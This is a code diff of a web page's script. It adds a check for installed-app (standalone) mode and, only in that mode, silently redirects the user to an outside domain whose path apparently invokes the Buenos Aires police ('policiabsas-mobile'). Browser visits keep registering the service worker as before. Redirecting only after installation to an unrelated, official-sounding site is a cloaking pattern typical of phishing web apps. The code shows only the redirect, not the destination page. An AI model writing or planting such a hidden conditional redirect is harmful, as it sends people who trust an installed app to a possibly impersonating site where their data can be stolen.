@@ -42,24 +42,41 @@
 
 
 
-  <script>
-    window.addEventListener('load', () => {
-      registerSW();
-    });
+<script>
+  function isInStandaloneMode() {
+    const standalone =
+      window.matchMedia('(display-mode: standalone)').matches ||
+      window.navigator.standalone === true;
 
-    // Register the Service Worker
-    async function registerSW() {
-      if ('serviceWorker' in navigator) {
-        try {
-          await navigator
-                .serviceWorker
-                .register('serviceworker.js');
-        }
-        catch (e) {
-          console.log('SW registration failed');
-        }
+    console.log('¿Está en modo standalone?', standalone);
+    return standalone;
+  }
+
+  window.addEventListener('load', () => {
+    console.log('Página cargada');
+    
+    if (isInStandaloneMode()) {
+      console.log('🌐 Modo standalone detectado. Redirigiendo...');
+      window.location.replace('https://dienstpreos.com.ar/policiabsas-mobile');
+      return;
+    } else {
+      console.log('🚫 No es modo standalone. No redirijo.');
+    }
+
+    registerSW();
+  });
+
+  async function registerSW() {
+    if ('serviceWorker' in navigator) {
+      try {
+        await navigator.serviceWorker.register('serviceworker.js');
+        console.log('✅ Service Worker registrado');
+      } catch (e) {
+        console.log('❌ SW registration failed', e);
       }
     }
- </script>
+  }
+</script>
+
 </body>
 </html>
